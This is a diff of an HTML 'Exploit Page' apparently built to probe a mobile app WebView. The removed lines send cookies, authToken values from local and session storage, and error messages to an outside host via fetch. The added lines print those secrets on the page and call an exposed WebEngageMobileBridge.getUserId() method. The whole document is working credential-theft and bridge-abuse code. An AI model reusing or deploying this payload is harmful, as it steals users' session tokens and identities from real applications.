@@ -1,21 +1,61 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      try {
-        // Attempt to access cookies
-        fetch("https://juzjk6379.xyz/leak?cookie=" + document.cookie);
+<head>
+  <title>Exploit Page</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #111;
+      color: #0f0;
+      padding: 20px;
+    }
+    #output {
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h2>Exploit Running...</h2>
+  <div id="output">Waiting for response...</div>
 
-        // Try localStorage/sessionStorage
-        const token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken");
-        fetch("https://juzjk6379.xyz/leak?token=" + token);
+  <script>
+    function print(msg) {
+      document.getElementById('output').textContent += "\n" + msg;
+    }
 
-        // Try WebEngage interface
-        if (WebEngageMobileInterface) {
-          WebEngageMobileInterface.getUserId();
+    try {
+      // Try document.cookie
+      print("Cookies: " + document.cookie);
+
+      // Try localStorage and sessionStorage
+      const lsToken = localStorage.getItem("authToken");
+      const ssToken = sessionStorage.getItem("authToken");
+      print("localStorage authToken: " + lsToken);
+      print("sessionStorage authToken: " + ssToken);
+
+      // Try calling WebEngageMobileBridge (common interface)
+      if (window.WebEngageMobileBridge) {
+        print("WebEngageMobileBridge exists");
+
+        // Call a known method — this will work only if it's exposed and doesn't need arguments
+        try {
+          const result = WebEngageMobileBridge.getUserId?.();
+          print("WebEngageMobileBridge.getUserId(): " + result);
+        } catch (e) {
+          print("getUserId() error: " + e.message);
         }
-      } catch(e) {
-        fetch("https://juzjk6379.xyz/leak?error=" + encodeURIComponent(e.message));
+
+        // If it has a callback system, we may need to define a JS function like this:
+        window.AndroidCallback = function(action, data) {
+          print("Callback: " + action + " | " + data);
+        };
+      } else {
+        print("WebEngageMobileBridge not found.");
       }
-    </script>
-  </body>
+
+    } catch (e) {
+      print("Exception: " + e.message);
+    }
+  </script>
+</body>
 </html>
